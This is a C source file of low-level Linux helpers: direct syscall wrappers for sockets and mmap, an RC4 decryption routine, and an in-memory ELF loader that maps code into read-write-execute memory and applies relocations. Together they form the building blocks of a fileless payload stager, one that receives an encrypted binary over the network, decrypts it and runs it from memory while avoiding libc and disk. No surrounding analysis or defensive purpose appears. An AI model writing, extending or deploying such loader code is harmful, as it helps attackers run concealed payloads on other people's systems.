// helpers_linux.c

#include <elf.h>
#include <stdint.h>

#define SYS_read 0
#define SYS_write 1
#define SYS_close 3
#define SYS_mmap 9
#define SYS_socket 41
#define SYS_connect 42
#define SYS_recvfrom 45
#define SYS_exit 60

#define R_X86_64_NONE 0
#define R_X86_64_64 1
#define R_X86_64_RELATIVE 8
#define R_X86_64_GLOB_DAT 6
#define R_X86_64_JUMP_SLOT 7

static long _sys1(long n, long a)
{
    long r;
    __asm__ volatile("syscall"
        : "=a"(r)
        : "0"(n), "D"(a)
        : "rcx","r11","memory"
    );

    return r;
}

static long _sys3(long n, long a, long b, long c)
{
    long r;
    __asm__ volatile("syscall"
        : "=a"(r) : "0"(n), "D"(a), "S"(b), "d"(c)
        : "rcx","r11","memory"
    );

    return r;
}

static long _sys6(long n, long a, long b, long c, long d, long e, long f)
{
    long r;
    register long r4 __asm__("r10") = d;
    register long r5 __asm__("r8") = e;
    register long r6 __asm__("r9") = f;
    __asm__ volatile("syscall"
        : "=a"(r)
        : "0"(n),"D"(a),"S"(b),"d"(c),"r"(r4),"r"(r5),"r"(r6)
        : "rcx","r11","memory");
    return r;
}

long _syscall1(long n, long a)
{
    return _sys1(n, a);
}

void* _mmap(void* addr, uint64_t len, int prot, int flags)
{
    return (void*)_sys6(SYS_mmap, (long)addr, len, prot, flags, -1, 0);
}

int _strcmp(const char* a, const char* b)
{
    while (*a && *a == *b)
    {
        a++;
        b++;
    }

    return (unsigned char)*a - (unsigned char)*b;
}

void* _memcpy(void* d, const void* s, uint64_t n)
{
    char* dd = (char*)d; const char* ss = (const char*)s;
    for (uint64_t i = 0; i < n; i++)
        dd[i] = ss[i];

    return d;
}

void _memset(void* d, int c, uint64_t n)
{
    char* dd = (char*)d;
    for (uint64_t i = 0; i < n; i++)
        dd[i] = (char)c;
}

void _safe_exit(void)
{
    __asm__ volatile("syscall" : : "a"(60L), "D"(0L));
}

int _socket(int d, int t, int p) {
    return (int)_sys3(SYS_socket, d, t, p);
}

int _connect(int fd, void* addr, int len)
{
    return (int)_sys3(SYS_connect, fd, (long)addr, len);
}

int _recv(int fd, void* buf, int len, int flags)
{
    return (int)_sys6(SYS_recvfrom, fd, (long)buf, len, flags, 0, 0);
}

void _rc4_decrypt(const unsigned char* key, int key_len, unsigned char* data, uint32_t data_len)
{
    unsigned char S[256];
    for (int i = 0; i < 256; i++)
        S[i] = (unsigned char)i;

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    int i = 0;
    j = 0;
    for (uint32_t n = 0; n < data_len; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }
}

void* elf_load(char* raw)
{
    Elf64_Ehdr* eh = (Elf64_Ehdr*)raw;
    if (!(eh->e_ident[0]==0x7f && eh->e_ident[1]=='E' && eh->e_ident[2]=='L'  && eh->e_ident[3]=='F'))
        return 0;

    Elf64_Phdr* ph = (Elf64_Phdr*)(raw + eh->e_phoff);
    uint64_t min_va = (uint64_t)-1, max_va = 0;
    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type != 1)
            continue;
        if (ph[i].p_vaddr < min_va)
            min_va = ph[i].p_vaddr;

        uint64_t end = ph[i].p_vaddr + ph[i].p_memsz;
        if (end > max_va)
            max_va = end;
    }
    if (min_va == (uint64_t)-1)
        return 0;

    char* base = (char*)_mmap(0, max_va - min_va, 0x7, 0x22);
    if (!base)
        return 0;
    _memset(base, 0, max_va - min_va);

    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type != 1)
            continue;

        _memcpy(base + (ph[i].p_vaddr - min_va), raw  + ph[i].p_offset, ph[i].p_filesz);
    }

    uint64_t load_bias = (uint64_t)base - min_va;

    Elf64_Shdr* sh = (Elf64_Shdr*)(raw + eh->e_shoff);
    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type == 4)
        {   
            // SHT_RELA
            Elf64_Rela* rela  = (Elf64_Rela*)(raw + sh[i].sh_offset);
            int nrela = sh[i].sh_size / sizeof(Elf64_Rela);
            for (int j = 0; j < nrela; j++)
            {
                uint64_t  type = ELF64_R_TYPE(rela[j].r_info);
                uint64_t* slot = (uint64_t*)(load_bias + rela[j].r_offset);

                if (type == R_X86_64_RELATIVE)
                    *slot = load_bias + rela[j].r_addend;
                else if (type == R_X86_64_64)
                    *slot += load_bias;
                else if (type == R_X86_64_GLOB_DAT || type == R_X86_64_JUMP_SLOT)
                    *slot += load_bias;
            }
        }
    }

    return base;
}